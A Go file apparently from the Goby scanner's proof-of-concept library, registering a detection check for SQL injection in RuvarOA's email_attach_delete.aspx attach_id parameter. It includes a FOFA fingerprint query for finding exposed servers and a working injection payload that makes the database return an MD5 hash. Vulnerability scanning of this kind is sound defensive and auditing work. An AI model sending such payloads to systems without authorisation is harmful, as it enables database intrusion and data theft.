package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "RuvarOA协同办公平台email_attach_delete.aspx文件attach_id参数sql注入",
    "Description": "RuvarOA璐华OA协同办公平台/LHMail/email_attach_delete.aspx文件attach_id参数sql注入，可造成数据泄露，甚至服务器被入侵。",
    "Product": "Ruvar-OA",
    "Homepage": "http://gov.ruvar.com/",
    "DisclosureDate": "2014-09-14",
    "Author": "550165942@qq.com",
    "FofaQuery": "(body=\"<iframe id=\\\"ifrm\\\" width=\\\"100%\\\" height=\\\"100%\\\" frameborder=\\\"0\\\" scrolling=\\\"no\\\" src=\\\"/include/login.aspx\" || (title=\"协同办公平台\" && body=\"/include/login.aspx\" && (body=\"<frame\" || body=\"<iframe \")))",
    "Level": "2",
    "Impact": "<p>黑客可以直接执行SQL语句，从而控制整个服务器：获取数据、修改数据、删除数据等。</p>",
    "Recommendation": "<p>1.在网页代码中需要对用户输入的数据进行严格过滤。</p><p>2.部署Web应用防火墙，对数据库操作进行监控。</p><p>3.升级至最新版本。</p>",
    "References": [
        "https://bugs.shuimugan.com/bug/view?bug_no=65191"
    ],
    "HasExp": false,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/LHMail/email_attach_delete.aspx?attach_id=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "0xc4ca4238a0b923820dcc509a6f75849b",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2018-10-08 18:13:44",
    "fofacli_version": "3.0.9",
    "fofascan_version": "0.1.16",
    "status": "0",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "8.0",
    "Tags": [
        "SQL注入"
    ],
    "VulType": [
        "SQL注入"
    ],
    "GobyQuery": "(body=\"<iframe id=\\\"ifrm\\\" width=\\\"100%\\\" height=\\\"100%\\\" frameborder=\\\"0\\\" scrolling=\\\"no\\\" src=\\\"/include/login.aspx\" || (title=\"协同办公平台\" && body=\"/include/login.aspx\" && (body=\"<frame\" || body=\"<iframe \")))",
    "PocId": "9969"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
